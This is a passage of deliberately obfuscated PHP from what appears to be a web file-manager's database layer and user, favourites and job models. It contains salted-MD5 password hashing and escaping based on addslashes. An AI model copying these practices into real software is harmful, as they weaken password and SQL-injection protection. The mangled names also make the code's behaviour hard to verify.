$›™²†ä[1022]: default: if (!empty($ĞØõéÏ°)) { $ÇÔ”§Èû = $›™²†ä[974] . $ĞØõéÏ° . $›™²†ä[975]; } else { $ÇÔ”§Èû = $›™²†ä[976]; } } } $ã¨âò”Á = $this->query($ÇÔ”§Èû); $ÖŠØÎŒ = array(); foreach ($ã¨âò”Á as $¬¶õ§Úº => $–àüñÏ›) { $ÖŠØÎŒ[$¬¶õ§Úº] = current($–àüñÏ›); } return $ÖŠØÎŒ; } protected function parseLimit($ŸµÀæ„é) { $ÍÇ ™¸ò =& $_SERVER[³Ôà×Ó]; $õÌºÆ… = $ÍÇ ™¸ò[12]; if (!empty($ŸµÀæ„é)) { switch ($this->dbType) { case $ÍÇ ™¸ò[1019]: case $ÍÇ ™¸ò[1011]: $ŸµÀæ„é = explode($ÍÇ ™¸ò[50], $ŸµÀæ„é); if (count($ŸµÀæ„é) > 1) { $õÌºÆ… .= $ÍÇ ™¸ò[51] . $ŸµÀæ„é[1] . $ÍÇ ™¸ò[52] . $ŸµÀæ„é[0] . $ÍÇ ™¸ò[53]; } else { $õÌºÆ… .= $ÍÇ ™¸ò[51] . $ŸµÀæ„é[0] . $ÍÇ ™¸ò[53]; } break; case $ÍÇ ™¸ò[992]: case $ÍÇ ™¸ò[1010]: break; case $ÍÇ ™¸ò[994]: break; case $ÍÇ ™¸ò[993]: case $ÍÇ ™¸ò[995]: break; case $ÍÇ ™¸ò[1022]: default: $õÌºÆ… .= $ÍÇ ™¸ò[51] . $ŸµÀæ„é . $ÍÇ ™¸ò[53]; } } return $õÌºÆ…; } public function parseKey(&$¾“§™Ô, $†»òĞò• = true) { $²½ÇÊç =& $_SERVER[³Ôà×Ó]; if ($†»òĞò•) { $¾“§™Ô = $this->parseKeyCheck($¾“§™Ô); } if ($this->dbType == $²½ÇÊç[1022]) { if ($¾“§™Ô != $²½ÇÊç[220] && !preg_match($²½ÇÊç[986], $¾“§™Ô)) { $¾“§™Ô = $²½ÇÊç[470] . trim($¾“§™Ô, $²½ÇÊç[470]) . $²½ÇÊç[470]; } return $¾“§™Ô; } else { return parent::parseKey($¾“§™Ô, $†»òĞò•); } } public function close() { $this->_linkID = null; } public function error() { $å…÷è¸ =& $_SERVER[³Ôà×Ó]; if ($this->PDOStatement) { $şê¥Ì©ú = $this->PDOStatement->errorInfo(); $this->error = $şê¥Ì©ú[1] . $å…÷è¸[4] . $şê¥Ì©ú[2]; } else { $this->error = $å…÷è¸[12]; } if ($å…÷è¸[12] != $this->queryStr) { $this->error .= LNG($å…÷è¸[48]) . $this->queryStr; } think_trace($this->error, $å…÷è¸[12], $å…÷è¸[49]); return $this->error; } public function escapeString($·Ÿë”‚Ò) { $„ÓñÌ½¨ =& $_SERVER[³Ôà×Ó]; switch ($this->dbType) { case $„ÓñÌ½¨[1019]: case $„ÓñÌ½¨[992]: case $„ÓñÌ½¨[1010]: case $„ÓñÌ½¨[1022]: return addslashes($·Ÿë”‚Ò); case $„ÓñÌ½¨[994]: case $„ÓñÌ½¨[1011]: case $„ÓñÌ½¨[993]: case $„ÓñÌ½¨[995]: return str_ireplace($„ÓñÌ½¨[58], $„ÓñÌ½¨[59], $·Ÿë”‚Ò); } } protected function parseValue($õ¶ô„ˆû) { $ùªÙØõ° =& $_SERVER[³Ôà×Ó]; if (is_string($õ¶ô„ˆû)) { $ÓìŒë”› = strpos($õ¶ô„ˆû, $ùªÙØõ°[4]) === 0 && in_array($õ¶ô„ˆû, array_keys($this->bind)); $õ¶ô„ˆû = $ÓìŒë”› ? $this->escapeString($õ¶ô„ˆû) : $ùªÙØõ°[1032] . $this->escapeString($õ¶ô„ˆû) . $ùªÙØõ°[1032]; } elseif (isset($õ¶ô„ˆû[0]) && is_string($õ¶ô„ˆû[0]) && strtolower($õ¶ô„ˆû[0]) == $ùªÙØõ°[373]) { $õ¶ô„ˆû = $this->escapeString($õ¶ô„ˆû[1]); } elseif (is_array($õ¶ô„ˆû)) { $õ¶ô„ˆû = array_map(array($this, $ùªÙØõ°[1033]), $õ¶ô„ˆû); } elseif (is_bool($õ¶ô„ˆû)) { $õ¶ô„ˆû = $õ¶ô„ˆû ? $ùªÙØõ°[91] : $ùªÙØõ°[228]; } elseif (is_null($õ¶ô„ˆû)) { $õ¶ô„ˆû = $ùªÙØõ°[106]; } return $õ¶ô„ˆû; } public function getLastInsertId() { $ÌıÇ³» =& $_SERVER[³Ôà×Ó]; switch ($this->dbType) { case $ÌıÇ³»[1019]: case $ÌıÇ³»[1011]: case $ÌıÇ³»[992]: case $ÌıÇ³»[1010]: case $ÌıÇ³»[994]: case $ÌıÇ³»[1022]: return $this->_linkID->lastInsertId(); case $ÌıÇ³»[993]: case $ÌıÇ³»[995]: $¼âÃµüš = $this->table; $ª¡ÊËÊø = $this->query("\x53\105\x4c\105\x43\124\40{$¼âÃµüš}\x2e\143\x75\162\162\166\x61\154\x20\143\165\162\162\166\141\154\40\x46\122\x4f\x4d\x20\x64\165\141\154"); return $ª¡ÊËÊø ? $ª¡ÊËÊø[0][$ÌıÇ³»[1034]] : 0; } } } goto dÈ‘Š‰‘İ’; a„‘ŞŠ§ğ•: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($È„úîı¦) { $ ø¬ÓÙ• =& $_SERVER[³Ôà×Ó]; return array($ ø¬ÓÙ•[2078] => array(USER_ID, $ ø¬ÓÙ•[2439])); } protected function listData() { $ì‹âïŸì =& $_SERVER[³Ôà×Ó]; $–ïöŸ½ = array($ì‹âïŸì[1756] => USER_ID, $ì‹âïŸì[566] => 0); $¬÷àı¬„ = $ì‹âïŸì[2440]; $Õ¦”ÏÏì = $this->field($¬÷àı¬„)->where($–ïöŸ½)->order($ì‹âïŸì[2441])->select(); return $Õ¦”ÏÏì ? $Õ¦”ÏÏì : array(); } protected function resetCache() { } protected function listView() { $—ÀÍÇ¾ =& $_SERVER[³Ôà×Ó]; $à…‹„İØ = $this->listData(); $†ÍïŠ”Ñ = array_filter_by_field($à…‹„İØ, $—ÀÍÇ¾[33], $—ÀÍÇ¾[499]); $À³óËò = array_to_keyvalue($†ÍïŠ”Ñ, $—ÀÍÇ¾[12], $—ÀÍÇ¾[87]); if (!$À³óËò) { return $à…‹„İØ; } $ÊÄå = 2000; $ÈÍƒÕÀ = array($—ÀÍÇ¾[500] => array($—ÀÍÇ¾[501], $À³óËò)); $ÍÛÏ  = Model($—ÀÍÇ¾[899])->listSource($ÈÍƒÕÀ, $ÊÄå); $ÍÛÏ  = array_merge($ÍÛÏ [$—ÀÍÇ¾[86]], $ÍÛÏ [$—ÀÍÇ¾[85]]); $ÍÛÏ  = array_to_keyvalue($ÍÛÏ , $—ÀÍÇ¾[193]); foreach ($à…‹„İØ as $íÌ–…È => $óìËÓ¿³) { $ê®êš¡– = $ÍÛÏ [$óìËÓ¿³[$—ÀÍÇ¾[87]]]; $ê®êš¡– = $ê®êš¡– ? $ê®êš¡– : array(); $à…‹„İØ[$íÌ–…È] = array_merge($ê®êš¡–, $óìËÓ¿³); } return $à…‹„İØ; } protected function addFav($§–Ô—, $â×¬ÅÕç = '', $İûÊ›»Ï = "\x73\157\165\162\143\x65") { $Ğ¥ÊÜÓû =& $_SERVER[³Ôà×Ó]; $™‰Ñùòµ = array($Ğ¥ÊÜÓû[1756] => USER_ID, $Ğ¥ÊÜÓû[566] => 0, $Ğ¥ÊÜÓû[505] => $İûÊ›»Ï, $Ğ¥ÊÜÓû[504] => $§–Ô—); if ($this->where($™‰Ñùòµ)->find()) { return !1; } $™‰Ñùòµ = array($Ğ¥ÊÜÓû[1756] => USER_ID, $Ğ¥ÊÜÓû[566] => 0); $“¢ ƒÛú = $this->where($™‰Ñùòµ)->max($Ğ¥ÊÜÓû[1987]); if (!$“¢ ƒÛú) { $“¢ ƒÛú = 0; } if (!$â×¬ÅÕç && $İûÊ›»Ï == $Ğ¥ÊÜÓû[499]) { $çêÉ€È = Model($Ğ¥ÊÜÓû[1414])->where(array($Ğ¥ÊÜÓû[500] => $§–Ô—))->find(); if (!$çêÉ€È) { return !1; } $â×¬ÅÕç = $çêÉ€È[$Ğ¥ÊÜÓû[32]]; } $â×¬ÅÕç = $this->getAutoName($â×¬ÅÕç); $ÛÜÈğµè = array($Ğ¥ÊÜÓû[1756] => USER_ID, $Ğ¥ÊÜÓû[566] => 0, $Ğ¥ÊÜÓû[503] => $â×¬ÅÕç, $Ğ¥ÊÜÓû[504] => $§–Ô—, $Ğ¥ÊÜÓû[505] => $İûÊ›»Ï, $Ğ¥ÊÜÓû[1967] => $“¢ ƒÛú + 1); return $this->add($ÛÜÈğµè); } protected function remove($è¾€ıÔ¯) { $ÔÍ‰¥²³ =& $_SERVER[³Ôà×Ó]; $Öò‰–óµ = array($ÔÍ‰¥²³[1756] => USER_ID, $ÔÍ‰¥²³[502] => $è¾€ıÔ¯); return $this->where($Öò‰–óµ)->delete(); } protected function removeByName($ˆó±) { $÷÷µãæ¤ =& $_SERVER[³Ôà×Ó]; $¥– “¨ã = array($÷÷µãæ¤[1756] => USER_ID, $÷÷µãæ¤[503] => $ˆó±, $÷÷µãæ¤[566] => 0); return $this->where($¥– “¨ã)->delete(); } protected function rename($ëØùÆû¢, $àÜ²ô¾«) { $Í™œÅï° =& $_SERVER[³Ôà×Ó]; if ($ëØùÆû¢ == $àÜ²ô¾«) { return !1; } $–º§®ÓÏ = $this->getAutoName($àÜ²ô¾«); if ($àÜ²ô¾« != $–º§®ÓÏ) { return !1; } $´Ò¸•ÄÎ = array($Í™œÅï°[1756] => USER_ID, $Í™œÅï°[566] => 0, $Í™œÅï°[32] => $ëØùÆû¢); return $this->where($´Ò¸•ÄÎ)->save(array($Í™œÅï°[32] => $àÜ²ô¾«)); } protected function resetSort($à®¸È‚œ) { $Ï²˜ïŸ =& $_SERVER[³Ôà×Ó]; $à®¸È‚œ = is_array($à®¸È‚œ) ? $à®¸È‚œ : array(); $ı‘óÔÒæ = array($Ï²˜ïŸ[1756] => USER_ID); for ($ÚüşÕÂÕ = 0; $ÚüşÕÂÕ < count($à®¸È‚œ); $ÚüşÕÂÕ++) { $ı‘óÔÒæ[$Ï²˜ïŸ[502]] = $à®¸È‚œ[$ÚüşÕÂÕ]; $this->where($ı‘óÔÒæ)->save(array($Ï²˜ïŸ[1967] => $ÚüşÕÂÕ + 1)); } return !0; } protected function moveTop($¼ù´öÅİ) { $¡›¡¤Ø =& $_SERVER[³Ôà×Ó]; $ĞÔ©»Œ = array($¡›¡¤Ø[1756] => USER_ID, $¡›¡¤Ø[566] => 0); $çòŞ¶Áì = $this->where($ĞÔ©»Œ)->where(array($¡›¡¤Ø[32] => $¼ù´öÅİ))->find(); if (!$çòŞ¶Áì) { return; } $™‡›ÄóŒ = $this->field($¡›¡¤Ø[484])->where($ĞÔ©»Œ)->order($¡›¡¤Ø[2441])->select(); $™‡›ÄóŒ = array_to_keyvalue($™‡›ÄóŒ, $¡›¡¤Ø[12], $¡›¡¤Ø[484]); $µ²ßÍ¡ = $™‡›ÄóŒ; $™‡›ÄóŒ = array_remove_value($™‡›ÄóŒ, $çòŞ¶Áì[$¡›¡¤Ø[484]]); array_unshift($™‡›ÄóŒ, $çòŞ¶Áì[$¡›¡¤Ø[484]]); return $this->resetSort($™‡›ÄóŒ); } protected function moveBottom($éù˜¶¦†) { $Îæğ¹°ç =& $_SERVER[³Ôà×Ó]; $ÛõâŠäñ = array($Îæğ¹°ç[1756] => USER_ID, $Îæğ¹°ç[566] => 0); $ìå³—œ = $this->where($ÛõâŠäñ)->max($Îæğ¹°ç[1987]); $ƒ÷ªÒ±ó = array($Îæğ¹°ç[1987] => $ìå³—œ + 1); return $this->where($ÛõâŠäñ)->where(array($Îæğ¹°ç[32] => $éù˜¶¦†))->save($ƒ÷ªÒ±ó); } private function getAutoName($Ğ§Ì›Œ) { $¶‹àŒ§ò =& $_SERVER[³Ôà×Ó]; $óòûéõî = array($¶‹àŒ§ò[1756] => USER_ID, $¶‹àŒ§ò[566] => 0); $ÎìÛîå = $this->field($¶‹àŒ§ò[32])->where($óòûéõî)->select(); $ÎìÛîå = array_to_keyvalue($ÎìÛîå, $¶‹àŒ§ò[12], $¶‹àŒ§ò[32]); if (!$ÎìÛîå || !in_array($Ğ§Ì›Œ, $ÎìÛîå)) { return $Ğ§Ì›Œ; } for ($ÅµÍÙ¯ = 0; $ÅµÍÙ¯ < count($ÎìÛîå); $ÅµÍÙ¯++) { if (!in_array($Ğ§Ì›Œ . "\50{$ÅµÍÙ¯}\51", $ÎìÛîå)) { return $Ğ§Ì›Œ . "\50{$ÅµÍÙ¯}\51"; } } return $Ğ§Ì›Œ . "\x28{$ÅµÍÙ¯}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\155\56\152\x6f\142\114\x69\x73\164"; public $field = array("\156\141\155\x65", "\144\x65\163\x63", "\x73\157\162\164"); const JOB_KEY = "\163\145\x6c\x66\112\x6f\142\114\151\163\x74"; public function listData($ãİç‡Éë = false, $ˆ¢Ş÷éÖ = "\163\x6f\x72\164", $¦™¯»Á© = false) { return parent::listData($ãİç‡Éë, $ˆ¢Ş÷éÖ, $¦™¯»Á©); } public function remove($Çê¨¼½º) { return parent::remove($Çê¨¼½º); } public function add($õ¸Ñõšª) { $¶±ğ‘ÒÍ =& $_SERVER[³Ôà×Ó]; if ($this->findByName($õ¸Ñõšª[$¶±ğ‘ÒÍ[32]])) { return !1; } $õ¸Ñõšª[$¶±ğ‘ÒÍ[1987]] = $this->getSort(); return parent::insert($õ¸Ñõšª); } private function getSort() { $ùÊ¾§™ş =& $_SERVER[³Ôà×Ó]; $”Òîı†Ú = parent::listData(); $ÂíƒÂÔû = array_to_keyvalue($”Òîı†Ú, $ùÊ¾§™ş[12], $ùÊ¾§™ş[1987]); return empty($ÂíƒÂÔû) ? 0 : max($ÂíƒÂÔû) + 1; } public function update($ËØ†ºØ­, $Ô¦ÃÁ¾) { $îÎ¨¬Ÿò =& $_SERVER[³Ôà×Ó]; $°±Êµ®í = parent::listData($ËØ†ºØ­); $¢£ê€æ = $this->findByName($Ô¦ÃÁ¾[$îÎ¨¬Ÿò[32]]); if (!$°±Êµ®í || $¢£ê€æ && $¢£ê€æ[$îÎ¨¬Ÿò[484]] != $°±Êµ®í[$îÎ¨¬Ÿò[484]]) { return !1; } return parent::update($ËØ†ºØ­, $Ô¦ÃÁ¾); } public function setUserJob($Ä¡¸Å˜Ë, $÷ñ›œ¬) { $æıõŒ­™ =& $_SERVER[³Ôà×Ó]; if (!is_array($÷ñ›œ¬)) { $÷ñ›œ¬ = array($÷ñ›œ¬); } $Š½†¬ü­ = parent::listData(); $§öº¥ˆ¥ = array_to_keyvalue($Š½†¬ü­, $æıõŒ­™[32]); $÷‹¢à„ã = $æıõŒ­™[463]; foreach ($÷ñ›œ¬ as $Ö“ÎĞì®) { if ($§öº¥ˆ¥[$Ö“ÎĞì®]) { $÷‹¢à„ã .= $§öº¥ˆ¥[$Ö“ÎĞì®][$æıõŒ­™[484]] . $æıõŒ­™[50]; } else { $ºÊ¬äå = $this->add($Ö“ÎĞì®); $÷‹¢à„ã .= $ºÊ¬äå . $æıõŒ­™[50]; } } $÷‹¢à„ã = rtrim($÷‹¢à„ã, $æıõŒ­™[50]); Model($æıõŒ­™[607])->metaSet($Ä¡¸Å˜Ë, self::JOB_KEY, $÷‹¢à„ã); } public function getUserJob($·„™Ùà˜) { $ş·ã¥îÀ = Model($_SERVER[³Ôà×Ó][607])->metaGet($·„™Ùà˜); return $this->getUserJobInfo($ş·ã¥îÀ[self::JOB_KEY]); } public function getUserJobInfo($²çŒ¡Ø) { $¥ïï¤úÊ =& $_SERVER[³Ôà×Ó]; $¢’‘ÜÖ = explode($¥ïï¤úÊ[50], $²çŒ¡Ø); $Ù¿«ğİä = parent::listData(); $Ù¿«ğİä = array_remove_key($Ù¿«ğİä, $¥ïï¤úÊ[231]); $Û™¦Î¹¥ = array(); foreach ($¢’‘ÜÖ as $ƒ¸ò§±) { if (isset($Ù¿«ğİä[$ƒ¸ò§±])) { $Û™¦Î¹¥[] = $Ù¿«ğİä[$ƒ¸ò§±]; } } return $Û™¦Î¹¥; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\164\x61\x62\x6c\x65\116\141\x6d\x65" => "\x75\163\145\162\x5f\155\x65\164\x61", "\155\x65\164\x61\x46\x69\x65\154\144" => "\x75\163\x65\162\x49\x44"); protected $simpleField = "\165\163\145\162\111\x44\54\x6e\x69\143\153\x4e\141\155\x65\54\x6e\141\155\145\54\141\166\x61\x74\x61\162\54\163\145\170\x2c\163\x74\141\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($–ü›òì‚) { $Ú¼•™¹¢ =& $_SERVER[³Ôà×Ó]; $‚Ú¥ğ˜¥ = $Ú¼•™¹¢[2442]; return array($Ú¼•™¹¢[2045] => array($–ü›òì‚[0], $‚Ú¥ğ˜¥), $Ú¼•™¹¢[2047] => array($–ü›òì‚[0], $‚Ú¥ğ˜¥), $Ú¼•™¹¢[2443] => array($–ü›òì‚[0], $‚Ú¥ğ˜¥)); } protected function getInfo($â§«ˆ¤ù, $àışÆ¦ = false) { $Š©ó¨‰Å = $this->getInfoSimple($â§«ˆ¤ù); if (!is_array($Š©ó¨‰Å)) { return array(); } if ($àışÆ¦) { return $this->_getInfoApply($Š©ó¨‰Å); } return $this->cacheFunctionGet($_SERVER[³Ôà×Ó][2049], $â§«ˆ¤ù); } protected function getInfoFull($ÑíÑşÊ‚, $ñúó¶Û€ = false) { $’¡ÆÇ— = $this->getInfoSimple($ÑíÑşÊ‚); if (!is_array($’¡ÆÇ—)) { return array(); } if ($ñúó¶Û€) { return $this->_getInfoApply($’¡ÆÇ—, !0); } return $this->cacheFunctionGet($_SERVER[³Ôà×Ó][2444], $ÑíÑşÊ‚); } private function _getInfoApply($Ùˆµüæ¯, $ÕŸÁÄÓ¢ = false) { $ºÌÎÃÒ‡ =& $_SERVER[³Ôà×Ó]; if (!$Ùˆµüæ¯) { return $Ùˆµüæ¯; } $Šä®·—Î = md5($ºÌÎÃÒ‡[2445] . $Ùˆµüæ¯[$ºÌÎÃÒ‡[964]] . $ºÌÎÃÒ‡[2446] . $Ùˆµüæ¯[$ºÌÎÃÒ‡[32]]); $Ùˆµüæ¯ = $this->_listDataApplyItem($Ùˆµüæ¯); $Û’¡‹Æ = Model($ºÌÎÃÒ‡[1414])->metaGet($Ùˆµüæ¯[$ºÌÎÃÒ‡[90]][$ºÌÎÃÒ‡[193]]); $Ùˆµüæ¯[$ºÌÎÃÒ‡[2447]] = $Šä®·—Î; $Ùˆµüæ¯[$ºÌÎÃÒ‡[90]][$ºÌÎÃÒ‡[2243]] = isset($Û’¡‹Æ[$ºÌÎÃÒ‡[2244]]) ? $Û’¡‹Æ[$ºÌÎÃÒ‡[2244]] : null; if ($ÕŸÁÄÓ¢) { $Ùˆµüæ¯[$ºÌÎÃÒ‡[548]] = $this->metaGet($Ùˆµüæ¯[$ºÌÎÃÒ‡[1765]]); } return $Ùˆµüæ¯; } protected function getInfoSimple($²¯âŞ, $ê¬Å‚¶£ = false) { $ÂÂ…¥¤ =& $_SERVER[³Ôà×Ó]; if (!$²¯âŞ) { return array(); } if ($ê¬Å‚¶£) { $ùƒÍ¬úÖ = $this->where(array($ÂÂ…¥¤[1765] => intval($²¯âŞ)))->find(); if (!is_array($ùƒÍ¬úÖ)) { return array(); } $ùƒÍ¬úÖ[$ÂÂ…¥¤[2448]] = Action($ÂÂ…¥¤[2449])->parseUrl($ùƒÍ¬úÖ[$ÂÂ…¥¤[2448]]); return $ùƒÍ¬úÖ; } return $this->cacheFunctionGet($ÂÂ…¥¤[2050], $²¯âŞ); } protected function getInfoSimpleOuter($øÎ‰å––) { $¦šÊ‹«÷ =& $_SERVER[³Ôà×Ó]; if (!$øÎ‰å–– || $øÎ‰å–– == 0) { return array($¦šÊ‹«÷[1765] => $¦šÊ‹«÷[228], $¦šÊ‹«÷[32] => $¦šÊ‹«÷[176] . LNG($¦šÊ‹«÷[2450]) . $¦šÊ‹«÷[178], $¦šÊ‹«÷[2448] => STATIC_PATH . $¦šÊ‹«÷[2451]); } $Øõããà¯ = $this->cacheFunctionGet($¦šÊ‹«÷[2050], $øÎ‰å––); $±— ½î® = array_field_key($Øõããà¯, explode($¦šÊ‹«÷[50], $this->simpleField)); if (!$±— ½î®) { return array($¦šÊ‹«÷[1765] => $¦šÊ‹«÷[1270], $¦šÊ‹«÷[32] => $¦šÊ‹«÷[176] . LNG($¦šÊ‹«÷[2452]) . $¦šÊ‹«÷[178], $¦šÊ‹«÷[2448] => STATIC_PATH . $¦šÊ‹«÷[2453]); } $±— ½î®[$¦šÊ‹«÷[2448]] = Action($¦šÊ‹«÷[2449])->parseUrl($±— ½î®[$¦šÊ‹«÷[2448]]); return $±— ½î®; } protected function groupUser($Š“›òëò) { } public static function errorLang($ª½…’ã›) { $«î¤«öÏ =& $_SERVER[³Ôà×Ó]; $à”åçîÁ = array(self::ERROR_USER_NOT_EXISTS => $«î¤«öÏ[2454], self::ERROR_USER_PASSWORD_ERROR => $«î¤«öÏ[2455], self::ERROR_USER_EXIST_NAME => $«î¤«öÏ[2456], self::ERROR_USER_EXIST_PHONE => $«î¤«öÏ[2457], self::ERROR_USER_EXIST_EMAIL => $«î¤«öÏ[2458], self::ERROR_USER_LOGIN_LOCK => $«î¤«öÏ[2459], self::ERROR_IP_NOT_ALLOW => $«î¤«öÏ[2460], self::ERROR_USER_EXIST_NICKNAME => $«î¤«öÏ[2461]); $ô»Ù±êØ = LNG($à”åçîÁ[$ª½…’ã›]); if ($ª½…’ã› == self::ERROR_USER_LOGIN_LOCK) { $îĞĞ» = (int) Model($«î¤«öÏ[2462])->get($«î¤«öÏ[2463]); if ($îĞĞ» > 60) { $ô»Ù±êØ = str_replace($«î¤«öÏ[91], ceil($îĞĞ» / 60), $ô»Ù±êØ); } } return $ô»Ù±êØ; } public function getInfoByMeta($Ê×‚‡µÀ, $á³Á—Ô˜) { $Ê¹¡Øƒ™ =& $_SERVER[³Ôà×Ó]; $â ¨Í³Ù = Model($Ê¹¡Øƒ™[2464])->where(array($Ê¹¡Øƒ™[97] => $Ê×‚‡µÀ, $Ê¹¡Øƒ™[459] => $á³Á—Ô˜))->find(); if ($â ¨Í³Ù) { return $this->getInfo($â ¨Í³Ù[$Ê¹¡Øƒ™[1765]]); } return !1; } public function userLoginCheck($³¸Ùîè×, $Ëì¬†Âå) { $ü§¯ğÆ§ =& $_SERVER[³Ôà×Ó]; $şŠœ„¢è = $this->userLoginFind($³¸Ùîè×); if (!$şŠœ„¢è) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($şŠœ„¢è[$ü§¯ğÆ§[1765]], $Ëì¬†Âå)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($şŠœ„¢è[$ü§¯ğÆ§[1765]]); } public function userLoginFind($êğş¯Ó) { $İº–§€ß =& $_SERVER[³Ôà×Ó]; $ò©è³Ó = array($İº–§€ß[32] => $êğş¯Ó, $İº–§€ß[2251] => $êğş¯Ó, $İº–§€ß[381] => $êğş¯Ó, $İº–§€ß[2465] => $êğş¯Ó, $İº–§€ß[1075] => $İº–§€ß[1077]); if ($this->nickNameRpt()) { unset($ò©è³Ó[$İº–§€ß[2251]]); } return $this->where($ò©è³Ó)->find(); } public function clearCache($­ÚäÆ·È) { $ò¬ò”‚Ì =& $_SERVER[³Ôà×Ó]; $this->cacheFunctionClear($ò¬ò”‚Ì[2049], $­ÚäÆ·È); $this->cacheFunctionClear($ò¬ò”‚Ì[2050], $­ÚäÆ·È); $this->cacheFunctionClear($ò¬ò”‚Ì[2444], $­ÚäÆ·È); } public function userPasswordCheck($«—ô¸¿, $ƒ´ªêçâ) { $åÏ™…·¼ =& $_SERVER[³Ôà×Ó]; $¶¼­Š‚Ò = $this->where(array($åÏ™…·¼[1765] => intval($«—ô¸¿)))->find(); $åÇûÅ” = $this->metaGet($«—ô¸¿); $´¼óÊÑŠ = isset($åÇûÅ”[$åÏ™…·¼[2466]]) ? $åÇûÅ”[$åÏ™…·¼[2466]] : $åÏ™…·¼[12]; if (md5($´¼óÊÑŠ . trim($ƒ´ªêçâ)) !== $¶¼­Š‚Ò[$åÏ™…·¼[964]]) { return !1; } return !0; } public function userAdd($ó·¸‹Áİ) { $©˜ÌÁèÄ =& $_SERVER[³Ôà×Ó]; $ƒ¨ØÃ¿Ğ = array($©˜ÌÁèÄ[503] => $ó·¸‹Áİ[$©˜ÌÁèÄ[32]], $©˜ÌÁèÄ[2467] => $ó·¸‹Áİ[$©˜ÌÁèÄ[2169]], $©˜ÌÁèÄ[2468] => isset($ó·¸‹Áİ[$©˜ÌÁèÄ[381]]) ? $ó·¸‹Áİ[$©˜ÌÁèÄ[381]] : $©˜ÌÁèÄ[12], $©˜ÌÁèÄ[2469] => isset($ó·¸‹Áİ[$©˜ÌÁèÄ[2465]]) ? $ó·¸‹Áİ[$©˜ÌÁèÄ[2465]] : $©˜ÌÁèÄ[12], $©˜ÌÁèÄ[2470] => isset($ó·¸‹Áİ[$©˜ÌÁèÄ[2251]]) ? $ó·¸‹Áİ[$©˜ÌÁèÄ[2251]] : $ó·¸‹Áİ[$©˜ÌÁèÄ[32]], $©˜ÌÁèÄ[2471] => isset($ó·¸‹Áİ[$©˜ÌÁèÄ[2448]]) ? $ó·¸‹Áİ[$©˜ÌÁèÄ[2448]] : $©˜ÌÁèÄ[12], $©˜ÌÁèÄ[2472] => isset($ó·¸‹Áİ[$©˜ÌÁèÄ[2473]]) ? $ó·¸‹Áİ[$©˜ÌÁèÄ[2473]] : 1, $©˜ÌÁèÄ[2474] => $ó·¸‹Áİ[$©˜ÌÁèÄ[964]], $©˜ÌÁèÄ[2051] => isset($ó·¸‹Áİ[$©˜ÌÁèÄ[1950]]) ? $ó·¸‹Áİ[$©˜ÌÁèÄ[1950]] : 1024 * 1024 * 20, $©˜ÌÁèÄ[2052] => 0, $©˜ÌÁèÄ[2475] => 0, $©˜ÌÁèÄ[2096] => isset($ó·¸‹Áİ[$©˜ÌÁèÄ[825]]) ? $ó·¸‹Áİ[$©˜ÌÁèÄ[825]] : 1); if (!empty($ó·¸‹Áİ[$©˜ÌÁèÄ[1765]])) { $ƒ¨ØÃ¿Ğ[$©˜ÌÁèÄ[1765]] = $ó·¸‹Áİ[$©˜ÌÁèÄ[1765]]; } $Š´×ç³½ = $this->_checkExist($ó·¸‹Áİ); if ($Š´×ç³½ !== !0) { return $Š´×ç³½; } if (!empty($ƒ¨ØÃ¿Ğ[$©˜ÌÁèÄ[2448]]) && strlen($ƒ¨ØÃ¿Ğ[$©˜ÌÁèÄ[2448]]) > 255) { $ƒ¨ØÃ¿Ğ[$©˜ÌÁèÄ[2448]] = $©˜ÌÁèÄ[12]; } $ûæ¥çÎù = $this->add($ƒ¨ØÃ¿Ğ); $…Ñ±ÔÇƒ = array($©˜ÌÁèÄ[2474] => $ƒ¨ØÃ¿Ğ[$©˜ÌÁèÄ[964]], $©˜ÌÁèÄ[2470] => $ƒ¨ØÃ¿Ğ[$©˜ÌÁèÄ[2251]]); $this->userEdit($ûæ¥çÎù, $…Ñ±ÔÇƒ); Model($©˜ÌÁèÄ[1414])->userRootAdd($ûæ¥çÎù); return $ûæ¥çÎù; } protected function userEditTest($³…ÍÖ–, $İÈüµ») { return $this->call($_SERVER[³Ôà×Ó][2476], $³…ÍÖ–, $İÈüµ»); } protected function userEdit($²”Üşàƒ, $²«ß¥›) { $ÃíÔ¹Î• =& $_SERVER[³Ôà×Ó]; $œ‚œÚ¸¢ = $this->getInfoSimple($²”Üşàƒ); if (!$œ‚œÚ¸¢) { return !1; } $Ø´Ê…‡— = $this->_checkExist($²«ß¥›, $²”Üşàƒ); if ($Ø´Ê…‡— !== !0) { return $Ø´Ê…‡—; } if (isset($²«ß¥›[$ÃíÔ¹Î•[964]]) && trim($²«ß¥›[$ÃíÔ¹Î•[964]]) != $ÃíÔ¹Î•[12]) { $ŒĞù§ = $this->metaGet($²”Üşàƒ); if (empty($ŒĞù§[$ÃíÔ¹Î•[2466]])) { $ŒĞù§[$ÃíÔ¹Î•[2466]] = rand_string(10); Model($ÃíÔ¹Î•[586])->metaSet($²”Üşàƒ, $ÃíÔ¹Î•[2466], $ŒĞù§[$ÃíÔ¹Î•[2466]]); } $²«ß¥›[$ÃíÔ¹Î•[964]] = md5($ŒĞù§[$ÃíÔ¹Î•[2466]] . trim($²«ß¥›[$ÃíÔ¹Î•[964]])); } else { unset($²«ß¥›[$ÃíÔ¹Î•[964]]); } if (!empty($²«ß¥›[$ÃíÔ¹Î•[2448]]) && strlen($²«ß¥›[$ÃíÔ¹Î•[2448]]) > 255) { $²«ß¥›[$ÃíÔ¹Î•[2448]] = $ÃíÔ¹Î•[12]; } $this->where(array($ÃíÔ¹Î•[1756] => $²”Üşàƒ))->save($²«ß¥›); if (isset($²«ß¥›[$ÃíÔ¹Î•[2251]])) { $this->setNamePinyin($²”Üşàƒ, $²«ß¥›[$ÃíÔ¹Î•[2251]]); } $this->clearCache($²”Üşàƒ); return !0; } public function setNamePinyin($õ®£æ¦ì, $ñ¥±Ñ™¸ = false) { 